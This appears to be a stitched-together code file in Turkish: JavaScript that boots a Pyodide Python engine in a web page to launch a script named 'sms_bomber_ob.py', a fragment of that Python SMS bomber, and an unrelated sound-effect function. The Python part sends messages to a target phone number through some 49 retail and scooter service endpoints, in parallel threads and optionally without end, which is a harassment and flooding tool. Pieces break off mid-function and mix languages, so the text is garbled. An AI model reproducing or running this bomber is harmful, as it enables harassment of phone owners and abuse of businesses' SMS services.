    // CANLI WEB-PYTHON MOTORU AYARLARI (PYODIDE)
    // ==========================================
    let pyodideInstance = null;
    let inputQueue = []; 

    function validateNumberOnly(input) {
        input.value = input.value.replace(/[^0-9]/g, '');
    }

    // Python Ortamını ve Kütüphanelerini Başlatan Kısım
    async function initPythonEnv() {
        if (pyodideInstance) return;
        try {
            printLog("[SİSTEM]: Python WebAssembly çekirdeği yükleniyor...");
            pyodideInstance = await loadPyodide({
                stdout: (text) => { printLog(text); }, 
                stderr: (text) => { printLog(`[PYTHON HATA]: ${text}`, true); }
            });
            
            printLog("[SİSTEM]: Paket yöneticisi (micropip) kuruluyor...");
            await pyodideInstance.loadPackage("micropip");
            
            printLog("[SİSTEM]: 'requests' kütüphanesi yükleniyor...");
            await pyodideInstance.runPythonAsync(`
                import micropip
                await micropip.install('requests')
            `);

            // JavaScript girdilerini Python input()'una bağlayan köprü
            pyodideInstance.registerJsModule("js_input_bridge", {
                get_input: () => {
                    if (inputQueue.length > 0) return inputQueue.shift();
                    return null;
                }
            });

            printLog("[SİSTEM]: python sms_bomber_ob.py başlatılıyor...\n");
            
            document.getElementById("sms-prompt-lbl").innerText = "Script Aktif. Terminali takip edin.";
            document.getElementById("sms-input").placeholder = "Değer girin ve Gönder'e basın...";
            document.getElementById("sms-input").disabled = false;
            document.getElementById("sms-send-btn").disabled = false;

            // GERÇEK PYTHON KODUNU TETİKLEME
            runRealPythonScript();

        } catch (e) {
            printLog(`[HATA]: Motor başlatılamadı: ${e.message}`, true);
        }
    }

        if val is not None:
            return val
        time.sleep(0.1)

def send(number, amount, worker_amount):
    global clear
    global all_sends
    global success_sends
    global failed_sends
    start_time = int(time.perf_counter())
    functions = [a101, anadolu, aygaz, bim, bisu, ceptesok, coffy, defacto, englishhome, file, gez, gofody, goyakit, hayat, heyscooter, hizliecza, hop, ikinciyeni, ipragraz, istegelsin, jetle, joker, kalmasin, karma, kimgbister, macrocenter, marti, migros, mopas, ninewest, oliz, pawapp, paybol, petrolofisi, pinar, pisir, qumpara, rabbit, roombadi, saka, scooby, signalall, superpedestrian, sushico, tazi, tiklagelsin, total, weescooter, yotto]
    random.shuffle(functions)
    clear()
    print(f"{number} NUMARASINA SMS GÖNDERİMİ BAŞLATILDI!\n")
    if amount == 0:
        with concurrent.futures.ThreadPoolExecutor(max_workers=worker_amount) as executor:
            i = 0
            while True:
                executor.submit(send_service, number, functions[i % 49])
                i += 1
                if i == len(functions):
                    i = 0
    else:
        with concurrent.futures.ThreadPoolExecutor(max_workers=worker_amount) as executor:
            for i in range(amount):
                executor.submit(send_service, number, functions[i % 49])
    print("\nGÖNDERİM TAMAMLANDI!")
    print(f"{all_sends} SMS, {int(time.perf_counter()) - start_time} SANİYE İÇERİSİNDE GÖNDERİLDİ. {success_sends} BAŞARILI, {failed_sends} BAŞARISIZ.\n")
    all_sends = 0
    success_sends = 0
    failed_sends = 0
    restart()

    function playFlipperSound(type) {
        try {
            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
            if (type === 'click') {
                const osc = audioCtx.createOscillator(); const gain = audioCtx.createGain();
                osc.connect(gain); gain.connect(audioCtx.destination); osc.type = 'square';
                osc.frequency.setValueAtTime(850, audioCtx.currentTime); gain.gain.setValueAtTime(0.04, audioCtx.currentTime);
                osc.start(); osc.stop(audioCtx.currentTime + 0.02); 
            } else if (type === 'trink') {
                const now = audioCtx.currentTime;
                const osc1 = audioCtx.createOscillator(); const gain1 = audioCtx.createGain();
                osc1.connect(gain1); gain1.connect(audioCtx.destination); osc1.type = 'sine';
                osc1.frequency.setValueAtTime(1800, now); gain1.gain.setValueAtTime(0.06, now);
                gain1.gain.exponentialRampToValueAtTime(0.001, now + 0.15); osc1.start(now); osc1.stop(now + 0.15);
            }
        } catch (e) {}
    }
